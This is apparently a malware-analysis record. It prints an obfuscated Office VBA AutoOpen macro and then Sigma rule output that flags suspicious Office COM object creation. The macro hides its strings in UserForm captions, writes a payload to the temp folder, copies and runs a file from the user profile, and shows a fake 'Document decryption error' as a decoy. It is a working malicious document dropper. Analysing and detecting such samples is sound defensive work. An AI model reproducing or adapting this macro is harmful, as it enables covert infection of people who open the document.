Sub AutoOpen()
Dim xebfenki, woda, ywilv, itpygep, iviwrejm
xebfenki = UserForm1.pery.Caption
woda = UserForm1.asuvzi.Caption
Set jtykpype = CreateObject(xebfenki)
Set agulu = CreateObject(woda)
Set ntonnam = jtykpype.GetFolder(agulu.expandEnvironmentStrings("%PROGRAMFILES%"))
If ntonnam.Type = "File folder" Then
ywilv = UserForm1.aqets.Caption
itpygep = UserForm1.bigpof.Caption
Set pp = jtykpype.GetSpecialFolder(2)
iviwrejm = pp & UserForm1.tcirevko.Caption
Set wicasy = jtykpype.OpenTextFile(iviwrejm, 2, True)
wicasy.Write ywilv
wicasy.Close
qoglu = UserForm1.opwuwdol.Caption
yqobunj = agulu.expandEnvironmentStrings("%USERPROFILE%") & qoglu
FileCopy UserForm1.ywvomlu.Caption, yqobunj
Shell yqobunj & itpygep & iviwrejm, False
MsgBox ("Document decryption error")
End If
End Sub

sigma_analysis_results.rule_description:
Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.
This can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)
sigma_analysis_results.rule_title: Suspicious New Instance Of An Office COM Object
